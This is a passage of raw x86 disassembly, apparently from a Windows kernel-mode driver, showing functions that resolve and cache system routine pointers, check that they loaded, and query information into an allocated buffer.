   115fa:	sub    eax,ecx
   115fc:	sar    eax,1
   115fe:	mov    WORD PTR [ebp-0x8],ax
   11602:	mov    eax,DWORD PTR [ebp-0x8]
   11605:	add    eax,eax
   11607:	mov    WORD PTR [ebp-0x6],ax
   1160b:	mov    WORD PTR [ebp-0x8],ax
   1160f:	lea    eax,[ebp-0x8]
   11612:	push   eax
   11613:	call   DWORD PTR ds:0x1f034
   11619:	leave  
   1161a:	ret    0x4
   1161d:	int3   
   1161e:	int3   
   1161f:	int3   
   11620:	int3   
   11621:	int3   
   11622:	mov    edi,edi
   11624:	push   ebp
   11625:	mov    ebp,esp
   11627:	cmp    DWORD PTR [ebp+0x8],0x0
   1162b:	jge    0x11631
   1162d:	and    DWORD PTR [ebp+0x8],0x0
   11631:	push   DWORD PTR [ebp+0x8]
   11634:	call   0x10a52
   11639:	pop    ecx
   1163a:	pop    ebp
   1163b:	ret    0x8
   1163e:	int3   
   1163f:	int3   
   11640:	int3   
   11641:	int3   
   11642:	int3   
   11643:	int3   
   11644:	mov    edi,edi
   11646:	push   ebp
   11647:	mov    ebp,esp
   11649:	mov    eax,DWORD PTR [ebp+0x8]
   1164c:	test   eax,eax
   1164e:	je     0x1165d
   11650:	mov    ecx,DWORD PTR [ebp+0xc]
   11653:	mov    edx,DWORD PTR [ecx]
   11655:	mov    DWORD PTR [eax],edx
   11657:	mov    ecx,DWORD PTR [ecx+0x4]
   1165a:	mov    DWORD PTR [eax+0x4],ecx
   1165d:	pop    ebp
   1165e:	ret    0x8
   11661:	int3   
   11662:	int3   
   11663:	int3   
   11664:	int3   
   11665:	int3   
   11666:	mov    edi,edi
   11668:	push   ebp
   11669:	mov    ebp,esp
   1166b:	push   esi
   1166c:	mov    esi,ecx
   1166e:	call   0x1109a
   11673:	test   BYTE PTR [ebp+0x8],0x1
   11677:	je     0x11680
   11679:	push   esi
   1167a:	call   0x10a86
   1167f:	pop    ecx
   11680:	mov    eax,esi
   11682:	pop    esi
   11683:	pop    ebp
   11684:	ret    0x4
   11687:	int3   
   11688:	int3   
   11689:	int3   
   1168a:	int3   
   1168b:	int3   
   1168c:	test   BYTE PTR ds:0x7f8dc,0x1
   11693:	jne    0x116ab
   11695:	or     DWORD PTR ds:0x7f8dc,0x1
   1169c:	push   0x1df44
   116a1:	call   0x115e0
   116a6:	mov    ds:0x7f8d8,eax
   116ab:	mov    eax,ds:0x7f8d8
   116b0:	ret    
   116b1:	int3   
   116b2:	int3   
   116b3:	int3   
   116b4:	int3   
   116b5:	int3   
   116b6:	test   BYTE PTR ds:0x7f8e4,0x1
   116bd:	jne    0x116d5
   116bf:	or     DWORD PTR ds:0x7f8e4,0x1
   116c6:	push   0x1df60
   116cb:	call   0x115e0
   116d0:	mov    ds:0x7f8e0,eax
   116d5:	mov    eax,ds:0x7f8e0
   116da:	ret    
   116db:	int3   
   116dc:	int3   
   116dd:	int3   
   116de:	int3   
   116df:	int3   
   116e0:	test   BYTE PTR ds:0x7f8ec,0x1
   116e7:	jne    0x116ff
   116e9:	or     DWORD PTR ds:0x7f8ec,0x1
   116f0:	push   0x1df98
   116f5:	call   0x115e0
   116fa:	mov    ds:0x7f8e8,eax
   116ff:	mov    eax,ds:0x7f8e8
   11704:	ret    
   11705:	int3   
   11706:	int3   
   11707:	int3   
   11708:	int3   
   11709:	int3   
   1170a:	test   BYTE PTR ds:0x7f8f4,0x1
   11711:	jne    0x11729
   11713:	or     DWORD PTR ds:0x7f8f4,0x1
   1171a:	push   0x1dfba
   1171f:	call   0x115e0
   11724:	mov    ds:0x7f8f0,eax
   11729:	mov    eax,ds:0x7f8f0
   1172e:	ret    
   1172f:	int3   
   11730:	int3   
   11731:	int3   
   11732:	int3   
   11733:	int3   
   11734:	test   BYTE PTR ds:0x7f8fc,0x1
   1173b:	jne    0x11753
   1173d:	or     DWORD PTR ds:0x7f8fc,0x1
   11744:	push   0x1dffa
   11749:	call   0x115e0
   1174e:	mov    ds:0x7f8f8,eax
   11753:	mov    eax,ds:0x7f8f8
   11758:	ret    
   11759:	int3   
   1175a:	int3   
   1175b:	int3   
   1175c:	int3   
   1175d:	int3   
   1175e:	test   BYTE PTR ds:0x7f904,0x1
   11765:	jne    0x1177d
   11767:	or     DWORD PTR ds:0x7f904,0x1
   1176e:	push   0x1e010
   11773:	call   0x115e0
   11778:	mov    ds:0x7f900,eax
   1177d:	mov    eax,ds:0x7f900
   11782:	ret    
   11783:	int3   
   11784:	int3   
   11785:	int3   
   11786:	int3   
   11787:	int3   
   11788:	test   BYTE PTR ds:0x7f90c,0x1
   1178f:	jne    0x117a7
   11791:	or     DWORD PTR ds:0x7f90c,0x1
   11798:	push   0x1e044
   1179d:	call   0x115e0
   117a2:	mov    ds:0x7f908,eax
   117a7:	mov    eax,ds:0x7f908
   117ac:	ret    
   117ad:	int3   
   117ae:	int3   
   117af:	int3   
   117b0:	int3   
   117b1:	int3   
   117b2:	test   BYTE PTR ds:0x7f914,0x1
   117b9:	jne    0x117d1
   117bb:	or     DWORD PTR ds:0x7f914,0x1
   117c2:	push   0x1e076
   117c7:	call   0x115e0
   117cc:	mov    ds:0x7f910,eax
   117d1:	mov    eax,ds:0x7f910
   117d6:	ret    
   117d7:	int3   
   117d8:	int3   
   117d9:	int3   
   117da:	int3   
   117db:	int3   
   117dc:	test   BYTE PTR ds:0x7f91c,0x1
   117e3:	jne    0x117fb
   117e5:	or     DWORD PTR ds:0x7f91c,0x1
   117ec:	push   0x1e08a
   117f1:	call   0x115e0
   117f6:	mov    ds:0x7f918,eax
   117fb:	mov    eax,ds:0x7f918
   11800:	ret    
   11801:	int3   
   11802:	int3   
   11803:	int3   
   11804:	int3   
   11805:	int3   
   11806:	test   BYTE PTR ds:0x7f924,0x1
   1180d:	jne    0x11825
   1180f:	or     DWORD PTR ds:0x7f924,0x1
   11816:	push   0x1e0a2
   1181b:	call   0x115e0
   11820:	mov    ds:0x7f920,eax
   11825:	mov    eax,ds:0x7f920
   1182a:	ret    
   1182b:	int3   
   1182c:	int3   
   1182d:	int3   
   1182e:	int3   
   1182f:	int3   
   11830:	test   BYTE PTR ds:0x7f92c,0x1
   11837:	jne    0x1184f
   11839:	or     DWORD PTR ds:0x7f92c,0x1
   11840:	push   0x1e0be
   11845:	call   0x115e0
   1184a:	mov    ds:0x7f928,eax
   1184f:	mov    eax,ds:0x7f928
   11854:	ret    
   11855:	int3   
   11856:	int3   
   11857:	int3   
   11858:	int3   
   11859:	int3   
   1185a:	test   BYTE PTR ds:0x7f934,0x1
   11861:	jne    0x11879
   11863:	or     DWORD PTR ds:0x7f934,0x1
   1186a:	push   0x1e0f8
   1186f:	call   0x115e0
   11874:	mov    ds:0x7f930,eax
   11879:	mov    eax,ds:0x7f930
   1187e:	ret    
   1187f:	int3   
   11880:	int3   
   11881:	int3   
   11882:	int3   
   11883:	int3   
   11884:	test   BYTE PTR ds:0x7f93c,0x1
   1188b:	jne    0x118a3
   1188d:	or     DWORD PTR ds:0x7f93c,0x1
   11894:	push   0x1e112
   11899:	call   0x115e0
   1189e:	mov    ds:0x7f938,eax
   118a3:	mov    eax,ds:0x7f938
   118a8:	ret    
   118a9:	int3   
   118aa:	int3   
   118ab:	int3   
   118ac:	int3   
   118ad:	int3   
   118ae:	test   BYTE PTR ds:0x7f944,0x1
   118b5:	jne    0x118cd
   118b7:	or     DWORD PTR ds:0x7f944,0x1
   118be:	push   0x1e134
   118c3:	call   0x115e0
   118c8:	mov    ds:0x7f940,eax
   118cd:	mov    eax,ds:0x7f940
   118d2:	ret    
   118d3:	int3   
   118d4:	int3   
   118d5:	int3   
   118d6:	int3   
   118d7:	int3   
   118d8:	test   BYTE PTR ds:0x7f94c,0x1
   118df:	jne    0x118f7
   118e1:	or     DWORD PTR ds:0x7f94c,0x1
   118e8:	push   0x1e16e
   118ed:	call   0x115e0
   118f2:	mov    ds:0x7f948,eax
   118f7:	mov    eax,ds:0x7f948
   118fc:	ret    
   118fd:	int3   
   118fe:	int3   
   118ff:	int3   
   11900:	int3   
   11901:	int3   
   11902:	test   BYTE PTR ds:0x7f954,0x1
   11909:	jne    0x11921
   1190b:	or     DWORD PTR ds:0x7f954,0x1
   11912:	push   0x1e194
   11917:	call   0x115e0
   1191c:	mov    ds:0x7f950,eax
   11921:	mov    eax,ds:0x7f950
   11926:	ret    
   11927:	int3   
   11928:	int3   
   11929:	int3   
   1192a:	int3   
   1192b:	int3   
   1192c:	test   BYTE PTR ds:0x7f95c,0x1
   11933:	jne    0x1194b
   11935:	or     DWORD PTR ds:0x7f95c,0x1
   1193c:	push   0x1e1c4
   11941:	call   0x115e0
   11946:	mov    ds:0x7f958,eax
   1194b:	mov    eax,ds:0x7f958
   11950:	ret    
   11951:	int3   
   11952:	int3   
   11953:	int3   
   11954:	int3   
   11955:	int3   
   11956:	test   BYTE PTR ds:0x7f964,0x1
   1195d:	jne    0x11975
   1195f:	or     DWORD PTR ds:0x7f964,0x1
   11966:	push   0x1e1f6
   1196b:	call   0x115e0
   11970:	mov    ds:0x7f960,eax
   11975:	mov    eax,ds:0x7f960
   1197a:	ret    
   1197b:	int3   
   1197c:	int3   
   1197d:	int3   
   1197e:	int3   
   1197f:	int3   
   11980:	test   BYTE PTR ds:0x7f96c,0x1
   11987:	jne    0x1199f
   11989:	or     DWORD PTR ds:0x7f96c,0x1
   11990:	push   0x1e206
   11995:	call   0x115e0
   1199a:	mov    ds:0x7f968,eax
   1199f:	mov    eax,ds:0x7f968
   119a4:	ret    
   119a5:	int3   
   119a6:	int3   
   119a7:	int3   
   119a8:	int3   
   119a9:	int3   
   119aa:	test   BYTE PTR ds:0x7f974,0x1
   119b1:	jne    0x119c9
   119b3:	or     DWORD PTR ds:0x7f974,0x1
   119ba:	push   0x1e21a
   119bf:	call   0x115e0
   119c4:	mov    ds:0x7f970,eax
   119c9:	mov    eax,ds:0x7f970
   119ce:	ret    
   119cf:	int3   
   119d0:	int3   
   119d1:	int3   
   119d2:	int3   
   119d3:	int3   
   119d4:	test   BYTE PTR ds:0x7f97c,0x1
   119db:	jne    0x119f3
   119dd:	or     DWORD PTR ds:0x7f97c,0x1
   119e4:	push   0x1e238
   119e9:	call   0x115e0
   119ee:	mov    ds:0x7f978,eax
   119f3:	mov    eax,ds:0x7f978
   119f8:	ret    
   119f9:	int3   
   119fa:	int3   
   119fb:	int3   
   119fc:	int3   
   119fd:	int3   
   119fe:	test   BYTE PTR ds:0x7f984,0x1
   11a05:	jne    0x11a1d
   11a07:	or     DWORD PTR ds:0x7f984,0x1
   11a0e:	push   0x1e252
   11a13:	call   0x115e0
   11a18:	mov    ds:0x7f980,eax
   11a1d:	mov    eax,ds:0x7f980
   11a22:	ret    
   11a23:	int3   
   11a24:	int3   
   11a25:	int3   
   11a26:	int3   
   11a27:	int3   
   11a28:	test   BYTE PTR ds:0x7f98c,0x1
   11a2f:	jne    0x11a47
   11a31:	or     DWORD PTR ds:0x7f98c,0x1
   11a38:	push   0x1e26a
   11a3d:	call   0x115e0
   11a42:	mov    ds:0x7f988,eax
   11a47:	mov    eax,ds:0x7f988
   11a4c:	ret    
   11a4d:	int3   
   11a4e:	int3   
   11a4f:	int3   
   11a50:	int3   
   11a51:	int3   
   11a52:	test   BYTE PTR ds:0x7f994,0x1
   11a59:	jne    0x11a71
   11a5b:	or     DWORD PTR ds:0x7f994,0x1
   11a62:	push   0x1e288
   11a67:	call   0x115e0
   11a6c:	mov    ds:0x7f990,eax
   11a71:	mov    eax,ds:0x7f990
   11a76:	ret    
   11a77:	int3   
   11a78:	int3   
   11a79:	int3   
   11a7a:	int3   
   11a7b:	int3   
   11a7c:	test   BYTE PTR ds:0x7f99c,0x1
   11a83:	jne    0x11a9b
   11a85:	or     DWORD PTR ds:0x7f99c,0x1
   11a8c:	push   0x1e2a8
   11a91:	call   0x115e0
   11a96:	mov    ds:0x7f998,eax
   11a9b:	mov    eax,ds:0x7f998
   11aa0:	ret    
   11aa1:	int3   
   11aa2:	int3   
   11aa3:	int3   
   11aa4:	int3   
   11aa5:	int3   
   11aa6:	test   BYTE PTR ds:0x7f9a4,0x1
   11aad:	jne    0x11ac5
   11aaf:	or     DWORD PTR ds:0x7f9a4,0x1
   11ab6:	push   0x1e2c8
   11abb:	call   0x115e0
   11ac0:	mov    ds:0x7f9a0,eax
   11ac5:	mov    eax,ds:0x7f9a0
   11aca:	ret    
   11acb:	int3   
   11acc:	int3   
   11acd:	int3   
   11ace:	int3   
   11acf:	int3   
   11ad0:	test   BYTE PTR ds:0x7f9ac,0x1
   11ad7:	jne    0x11aef
   11ad9:	or     DWORD PTR ds:0x7f9ac,0x1
   11ae0:	push   0x1e2e8
   11ae5:	call   0x115e0
   11aea:	mov    ds:0x7f9a8,eax
   11aef:	mov    eax,ds:0x7f9a8
   11af4:	ret    
   11af5:	int3   
   11af6:	int3   
   11af7:	int3   
   11af8:	int3   
   11af9:	int3   
   11afa:	test   BYTE PTR ds:0x7f9b4,0x1
   11b01:	jne    0x11b19
   11b03:	or     DWORD PTR ds:0x7f9b4,0x1
   11b0a:	push   0x1e2fe
   11b0f:	call   0x115e0
   11b14:	mov    ds:0x7f9b0,eax
   11b19:	mov    eax,ds:0x7f9b0
   11b1e:	ret    
   11b1f:	int3   
   11b20:	int3   
   11b21:	int3   
   11b22:	int3   
   11b23:	int3   
   11b24:	test   BYTE PTR ds:0x7f9bc,0x1
   11b2b:	jne    0x11b43
   11b2d:	or     DWORD PTR ds:0x7f9bc,0x1
   11b34:	push   0x1e328
   11b39:	call   0x115e0
   11b3e:	mov    ds:0x7f9b8,eax
   11b43:	mov    eax,ds:0x7f9b8
   11b48:	ret    
   11b49:	int3   
   11b4a:	int3   
   11b4b:	int3   
   11b4c:	int3   
   11b4d:	int3   
   11b4e:	test   BYTE PTR ds:0x7f9c4,0x1
   11b55:	jne    0x11b6d
   11b57:	or     DWORD PTR ds:0x7f9c4,0x1
   11b5e:	push   0x1e340
   11b63:	call   0x115e0
   11b68:	mov    ds:0x7f9c0,eax
   11b6d:	mov    eax,ds:0x7f9c0
   11b72:	ret    
   11b73:	int3   
   11b74:	int3   
   11b75:	int3   
   11b76:	int3   
   11b77:	int3   
   11b78:	test   BYTE PTR ds:0x7f9cc,0x1
   11b7f:	jne    0x11b97
   11b81:	or     DWORD PTR ds:0x7f9cc,0x1
   11b88:	push   0x1e36e
   11b8d:	call   0x115e0
   11b92:	mov    ds:0x7f9c8,eax
   11b97:	mov    eax,ds:0x7f9c8
   11b9c:	ret    
   11b9d:	int3   
   11b9e:	int3   
   11b9f:	int3   
   11ba0:	int3   
   11ba1:	int3   
   11ba2:	test   BYTE PTR ds:0x7f9d4,0x1
   11ba9:	jne    0x11bc1
   11bab:	or     DWORD PTR ds:0x7f9d4,0x1
   11bb2:	push   0x1e398
   11bb7:	call   0x115e0
   11bbc:	mov    ds:0x7f9d0,eax
   11bc1:	mov    eax,ds:0x7f9d0
   11bc6:	ret    
   11bc7:	int3   
   11bc8:	int3   
   11bc9:	int3   
   11bca:	int3   
   11bcb:	int3   
   11bcc:	test   BYTE PTR ds:0x7f9dc,0x1
   11bd3:	jne    0x11beb
   11bd5:	or     DWORD PTR ds:0x7f9dc,0x1
   11bdc:	push   0x1e3b6
   11be1:	call   0x115e0
   11be6:	mov    ds:0x7f9d8,eax
   11beb:	mov    eax,ds:0x7f9d8
   11bf0:	ret    
   11bf1:	int3   
   11bf2:	int3   
   11bf3:	int3   
   11bf4:	int3   
   11bf5:	int3   
   11bf6:	test   BYTE PTR ds:0x7f9e4,0x1
   11bfd:	jne    0x11c15
   11bff:	or     DWORD PTR ds:0x7f9e4,0x1
   11c06:	push   0x1e3e4
   11c0b:	call   0x115e0
   11c10:	mov    ds:0x7f9e0,eax
   11c15:	mov    eax,ds:0x7f9e0
   11c1a:	ret    
   11c1b:	int3   
   11c1c:	int3   
   11c1d:	int3   
   11c1e:	int3   
   11c1f:	int3   
   11c20:	test   BYTE PTR ds:0x7f9ec,0x1
   11c27:	jne    0x11c3f
   11c29:	or     DWORD PTR ds:0x7f9ec,0x1
   11c30:	push   0x1e40a
   11c35:	call   0x115e0
   11c3a:	mov    ds:0x7f9e8,eax
   11c3f:	mov    eax,ds:0x7f9e8
   11c44:	ret    
   11c45:	int3   
   11c46:	int3   
   11c47:	int3   
   11c48:	int3   
   11c49:	int3   
   11c4a:	test   BYTE PTR ds:0x7f9f4,0x1
   11c51:	jne    0x11c69
   11c53:	or     DWORD PTR ds:0x7f9f4,0x1
   11c5a:	push   0x1e42a
   11c5f:	call   0x115e0
   11c64:	mov    ds:0x7f9f0,eax
   11c69:	mov    eax,ds:0x7f9f0
   11c6e:	ret    
   11c6f:	int3   
   11c70:	int3   
   11c71:	int3   
   11c72:	int3   
   11c73:	int3   
   11c74:	test   BYTE PTR ds:0x7f9fc,0x1
   11c7b:	jne    0x11c93
   11c7d:	or     DWORD PTR ds:0x7f9fc,0x1
   11c84:	push   0x1e454
   11c89:	call   0x115e0
   11c8e:	mov    ds:0x7f9f8,eax
   11c93:	mov    eax,ds:0x7f9f8
   11c98:	ret    
   11c99:	int3   
   11c9a:	int3   
   11c9b:	int3   
   11c9c:	int3   
   11c9d:	int3   
   11c9e:	test   BYTE PTR ds:0x7fa04,0x1
   11ca5:	jne    0x11cbd
   11ca7:	or     DWORD PTR ds:0x7fa04,0x1
   11cae:	push   0x1e478
   11cb3:	call   0x115e0
   11cb8:	mov    ds:0x7fa00,eax
   11cbd:	mov    eax,ds:0x7fa00
   11cc2:	ret    
   11cc3:	int3   
   11cc4:	int3   
   11cc5:	int3   
   11cc6:	int3   
   11cc7:	int3   
   11cc8:	test   BYTE PTR ds:0x7fa0c,0x1
   11ccf:	jne    0x11ce7
   11cd1:	or     DWORD PTR ds:0x7fa0c,0x1
   11cd8:	push   0x1e4a2
   11cdd:	call   0x115e0
   11ce2:	mov    ds:0x7fa08,eax
   11ce7:	mov    eax,ds:0x7fa08
   11cec:	ret    
   11ced:	int3   
   11cee:	int3   
   11cef:	int3   
   11cf0:	int3   
   11cf1:	int3   
   11cf2:	test   BYTE PTR ds:0x7fa14,0x1
   11cf9:	jne    0x11d11
   11cfb:	or     DWORD PTR ds:0x7fa14,0x1
   11d02:	push   0x1e4d8
   11d07:	call   0x115e0
   11d0c:	mov    ds:0x7fa10,eax
   11d11:	mov    eax,ds:0x7fa10
   11d16:	ret    
   11d17:	int3   
   11d18:	int3   
   11d19:	int3   
   11d1a:	int3   
   11d1b:	int3   
   11d1c:	call   0x1168c
   11d21:	test   eax,eax
   11d23:	jne    0x11d28
   11d25:	xor    eax,eax
   11d27:	ret    
   11d28:	call   0x116b6
   11d2d:	test   eax,eax
   11d2f:	je     0x11d25
   11d31:	call   0x116e0
   11d36:	test   eax,eax
   11d38:	je     0x11d25
   11d3a:	call   0x1170a
   11d3f:	test   eax,eax
   11d41:	je     0x11d25
   11d43:	call   0x11734
   11d48:	test   eax,eax
   11d4a:	je     0x11d25
   11d4c:	call   0x1175e
   11d51:	test   eax,eax
   11d53:	je     0x11d25
   11d55:	call   0x11788
   11d5a:	test   eax,eax
   11d5c:	je     0x11d25
   11d5e:	call   0x117b2
   11d63:	test   eax,eax
   11d65:	je     0x11d25
   11d67:	call   0x117dc
   11d6c:	test   eax,eax
   11d6e:	je     0x11d25
   11d70:	call   0x11806
   11d75:	test   eax,eax
   11d77:	je     0x11d25
   11d79:	call   0x11830
   11d7e:	test   eax,eax
   11d80:	je     0x11d25
   11d82:	call   0x1185a
   11d87:	test   eax,eax
   11d89:	je     0x11d25
   11d8b:	call   0x11884
   11d90:	test   eax,eax
   11d92:	je     0x11d25
   11d94:	call   0x118ae
   11d99:	test   eax,eax
   11d9b:	je     0x11d25
   11d9d:	call   0x118d8
   11da2:	test   eax,eax
   11da4:	je     0x11d25
   11daa:	call   0x11902
   11daf:	test   eax,eax
   11db1:	je     0x11d25
   11db7:	call   0x1192c
   11dbc:	test   eax,eax
   11dbe:	je     0x11d25
   11dc4:	call   0x11956
   11dc9:	test   eax,eax
   11dcb:	je     0x11d25
   11dd1:	call   0x11980
   11dd6:	test   eax,eax
   11dd8:	je     0x11d25
   11dde:	call   0x119aa
   11de3:	test   eax,eax
   11de5:	je     0x11d25
   11deb:	call   0x119d4
   11df0:	test   eax,eax
   11df2:	je     0x11d25
   11df8:	call   0x119fe
   11dfd:	test   eax,eax
   11dff:	je     0x11d25
   11e05:	call   0x11a28
   11e0a:	test   eax,eax
   11e0c:	je     0x11d25
   11e12:	call   0x11a52
   11e17:	test   eax,eax
   11e19:	je     0x11d25
   11e1f:	call   0x11a7c
   11e24:	test   eax,eax
   11e26:	je     0x11d25
   11e2c:	call   0x11aa6
   11e31:	test   eax,eax
   11e33:	je     0x11d25
   11e39:	call   0x11ad0
   11e3e:	test   eax,eax
   11e40:	je     0x11d25
   11e46:	call   0x11afa
   11e4b:	test   eax,eax
   11e4d:	je     0x11d25
   11e53:	call   0x11b24
   11e58:	test   eax,eax
   11e5a:	je     0x11d25
   11e60:	call   0x11b4e
   11e65:	test   eax,eax
   11e67:	je     0x11d25
   11e6d:	call   0x11b78
   11e72:	test   eax,eax
   11e74:	je     0x11d25
   11e7a:	call   0x11ba2
   11e7f:	test   eax,eax
   11e81:	je     0x11d25
   11e87:	call   0x11bcc
   11e8c:	test   eax,eax
   11e8e:	je     0x11d25
   11e94:	call   0x11bf6
   11e99:	test   eax,eax
   11e9b:	je     0x11d25
   11ea1:	call   0x11c20
   11ea6:	test   eax,eax
   11ea8:	je     0x11d25
   11eae:	call   0x11c4a
   11eb3:	test   eax,eax
   11eb5:	je     0x11d25
   11ebb:	call   0x11c74
   11ec0:	test   eax,eax
   11ec2:	je     0x11d25
   11ec8:	call   0x11c9e
   11ecd:	test   eax,eax
   11ecf:	je     0x11d25
   11ed5:	call   0x11cc8
   11eda:	test   eax,eax
   11edc:	je     0x11d25
   11ee2:	call   0x11cf2
   11ee7:	neg    eax
   11ee9:	sbb    eax,eax
   11eeb:	neg    eax
   11eed:	ret    
   11eee:	int3   
   11eef:	int3   
   11ef0:	int3   
   11ef1:	int3   
   11ef2:	int3   
   11ef3:	int3   
   11ef4:	mov    edi,edi
   11ef6:	push   esi
   11ef7:	mov    esi,ecx
   11ef9:	push   DWORD PTR [esi+0x48]
   11efc:	call   0x10a86
   11f01:	push   DWORD PTR [esi+0x24]
   11f04:	call   0x10a86
   11f09:	push   DWORD PTR [esi+0x1c]
   11f0c:	call   0x10a86
   11f11:	push   DWORD PTR [esi+0x14]
   11f14:	call   0x10a86
   11f19:	push   DWORD PTR [esi+0x8]
   11f1c:	call   0x10a86
   11f21:	push   DWORD PTR [esi]
   11f23:	call   0x10a86
   11f28:	add    esp,0x18
   11f2b:	pop    esi
   11f2c:	ret    
   11f2d:	int3   
   11f2e:	int3   
   11f2f:	int3   
   11f30:	int3   
   11f31:	int3   
   11f32:	mov    edi,edi
   11f34:	push   ebp
   11f35:	mov    ebp,esp
   11f37:	mov    eax,ecx
   11f39:	mov    ecx,DWORD PTR [ebp+0x8]
   11f3c:	mov    edx,DWORD PTR [ecx]
   11f3e:	test   edx,edx
   11f40:	je     0x11f49
   11f42:	mov    DWORD PTR [eax],edx
   11f44:	inc    DWORD PTR [edx+0x4]
   11f47:	jmp    0x11f4c
   11f49:	and    DWORD PTR [eax],0x0
   11f4c:	pop    ebp
   11f4d:	ret    0x4
   11f50:	int3   
   11f51:	int3   
   11f52:	int3   
   11f53:	int3   
   11f54:	int3   
   11f55:	int3   
   11f56:	mov    edi,edi
   11f58:	push   ebp
   11f59:	mov    ebp,esp
   11f5b:	push   esi
   11f5c:	mov    esi,ecx
   11f5e:	mov    ecx,DWORD PTR [esi]
   11f60:	test   ecx,ecx
   11f62:	je     0x11f69
   11f64:	call   0x10aa4
   11f69:	mov    eax,DWORD PTR [ebp+0x8]
   11f6c:	mov    eax,DWORD PTR [eax]
   11f6e:	mov    DWORD PTR [esi],eax
   11f70:	inc    DWORD PTR [eax+0x4]
   11f73:	mov    eax,esi
   11f75:	pop    esi
   11f76:	pop    ebp
   11f77:	ret    0x4
   11f7a:	int3   
   11f7b:	int3   
   11f7c:	int3   
   11f7d:	int3   
   11f7e:	int3   
   11f7f:	int3   
   11f80:	mov    edi,edi
   11f82:	push   ebp
   11f83:	mov    ebp,esp
   11f85:	push   ebx
   11f86:	push   esi
   11f87:	push   edi
   11f88:	mov    edi,DWORD PTR [ebp+0xc]
   11f8b:	mov    esi,ecx
   11f8d:	and    DWORD PTR [esi+0x4],0x0
   11f91:	lea    eax,[edi+0x1]
   11f94:	push   eax
   11f95:	mov    DWORD PTR [esi+0x8],edi
   11f98:	call   0x10a52
   11f9d:	push   edi
   11f9e:	push   DWORD PTR [ebp+0x8]
   11fa1:	mov    ebx,eax
   11fa3:	push   ebx
   11fa4:	call   0x1dac6
   11fa9:	add    esp,0x10
   11fac:	inc    DWORD PTR [esi+0x4]
   11faf:	pop    edi
   11fb0:	mov    DWORD PTR [esi],ebx
   11fb2:	mov    eax,esi
   11fb4:	pop    esi
   11fb5:	pop    ebx
   11fb6:	pop    ebp
   11fb7:	ret    0x8
   11fba:	int3   
   11fbb:	int3   
   11fbc:	int3   
   11fbd:	int3   
   11fbe:	int3   
   11fbf:	int3   
   11fc0:	mov    edi,edi
   11fc2:	push   ebp
   11fc3:	mov    ebp,esp
   11fc5:	push   ecx
   11fc6:	push   edi
   11fc7:	lea    eax,[ebp-0x4]
   11fca:	push   eax
   11fcb:	xor    edi,edi
   11fcd:	push   edi
   11fce:	push   edi
   11fcf:	push   0x1b
   11fd1:	push   DWORD PTR [ebp+0x8]
   11fd4:	call   0x1175e
   11fd9:	call   eax
   11fdb:	cmp    eax,0xc0000004
   11fe0:	jne    0x12048
   11fe2:	mov    ecx,DWORD PTR [ebp-0x4]
   11fe5:	push   ebx
   11fe6:	mov    ebx,DWORD PTR [ebp+0xc]
   11fe9:	movzx  edx,WORD PTR [ebx+0x2]
   11fed:	lea    eax,[ecx-0x8]
   11ff0:	cmp    edx,eax
   11ff2:	jae    0x11ffe
   11ff4:	mov    WORD PTR [ebx],ax
   11ff7:	mov    eax,0x80000005
   11ffc:	jmp    0x12047
   11ffe:	push   esi
   11fff:	push   0x20736649
   12004:	push   ecx
   12005:	push   edi
   12006:	call   DWORD PTR ds:0x1f060
   1200c:	mov    esi,eax
   1200e:	cmp    esi,edi
   12010:	jne    0x12019
   12012:	mov    eax,0xc000009a
   12017:	jmp    0x12046
   12019:	lea    eax,[ebp-0x4]
   1201c:	push   eax
   1201d:	push   DWORD PTR [ebp-0x4]
   12020:	push   esi
   12021:	push   0x1b
   12023:	push   DWORD PTR [ebp+0x8]
   12026:	call   0x1175e
   1202b:	call   eax
   1202d:	mov    edi,eax
   1202f:	test   edi,edi
   12031:	jl     0x1203b
   12033:	push   esi
   12034:	push   ebx
   12035:	call   DWORD PTR ds:0x1f038
   1203b:	push   0x0
   1203d:	push   esi
   1203e:	call   DWORD PTR ds:0x1f01c
   12044:	mov    eax,edi
   12046:	pop    esi
   12047:	pop    ebx
   12048:	pop    edi
   12049:	leave  
   1204a:	ret    0x8
   1204d:	int3   
   1204e:	int3   
   1204f:	int3   
   12050:	int3   
   12051:	int3   
   12052:	mov    edi,edi
   12054:	push   ebp
   12055:	mov    ebp,esp
   12057:	sub    esp,0x18
   1205a:	push   0x0
   1205c:	push   0x18
   1205e:	lea    eax,[ebp-0x18]
   12061:	push   eax
   12062:	push   0x0
   12064:	push   DWORD PTR [ebp+0x8]
   12067:	call   0x1175e
   1206c:	call   eax
   1206e:	test   eax,eax
   12070:	jl     0x12077
   12072:	mov    eax,DWORD PTR [ebp-0x8]
   12075:	jmp    0x12079
   12077:	xor    eax,eax
   12079:	leave  
   1207a:	ret    0x4
   1207d:	int3   
   1207e:	int3   
   1207f:	int3   
   12080:	int3   
   12081:	int3   
   12082:	mov    edi,edi
   12084:	push   ebp
   12085:	mov    ebp,esp
   12087:	mov    ecx,DWORD PTR ds:0x7efac
   1208d:	sub    esp,0x38
   12090:	push   esi
   12091:	xor    esi,esi
   12093:	cmp    ecx,esi
   12095:	jne    0x1209f
   12097:	or     eax,0xffffffff
   1209a:	jmp    0x12186
   1209f:	push   edi
   120a0:	xor    eax,eax
   120a2:	mov    DWORD PTR [ebp-0x20],esi
   120a5:	lea    edi,[ebp-0x1c]
   120a8:	stos   DWORD PTR es:[edi],eax
   120a9:	lea    eax,[ebp-0x18]
   120ac:	push   eax
   120ad:	lea    eax,[ebp-0x38]
   120b0:	push   eax
   120b1:	push   0x400
   120b6:	lea    eax,[ebp-0x10]
   120b9:	push   eax
   120ba:	mov    DWORD PTR [ebp-0x4],esi
   120bd:	mov    DWORD PTR [ebp-0x38],0x18
   120c4:	mov    DWORD PTR [ebp-0x34],esi
   120c7:	mov    DWORD PTR [ebp-0x2c],esi
   120ca:	mov    DWORD PTR [ebp-0x30],esi
   120cd:	mov    DWORD PTR [ebp-0x28],esi
   120d0:	mov    DWORD PTR [ebp-0x24],esi
   120d3:	mov    DWORD PTR [ebp-0x18],ecx
   120d6:	mov    DWORD PTR [ebp-0x14],esi
   120d9:	call   0x1168c
   120de:	call   eax
   120e0:	mov    edi,eax
   120e2:	cmp    edi,esi
   120e4:	jl     0x12183
   120ea:	lea    eax,[ebp-0xc]
   120ed:	push   eax
   120ee:	push   0x8
   120f0:	push   DWORD PTR [ebp-0x10]
   120f3:	call   0x118d8
   120f8:	call   eax
   120fa:	mov    edi,eax
   120fc:	cmp    edi,esi
   120fe:	jl     0x12179
   12100:	lea    eax,[ebp-0x4]
   12103:	push   eax
   12104:	push   0x1
   12106:	push   esi
   12107:	push   esi
   12108:	push   0x1
